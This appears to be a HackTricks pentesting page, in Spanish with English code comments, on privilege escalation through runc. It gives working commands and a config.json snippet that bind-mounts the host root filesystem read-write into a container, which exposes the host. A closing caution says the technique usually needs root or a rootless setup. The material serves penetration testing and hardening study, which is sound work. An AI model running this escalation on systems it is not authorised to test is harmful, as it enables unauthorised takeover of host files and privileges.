# Escalación de privilegios de RunC

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Si deseas aprender más sobre **runc**, consulta la siguiente página:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si encuentras que `runc` está instalado en el host, es posible que puedas **ejecutar un contenedor montando la carpeta raíz / del host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Esto no siempre funcionará ya que la operación predeterminada de runc es ejecutarse como root, por lo que ejecutarlo como un usuario no privilegiado simplemente no puede funcionar (a menos que tengas una configuración sin root). Hacer que una configuración sin root sea la predeterminada no es generalmente una buena idea porque hay bastantes restricciones dentro de los contenedores sin root que no se aplican fuera de los contenedores sin root.

{{#include ../../banners/hacktricks-training.md}}
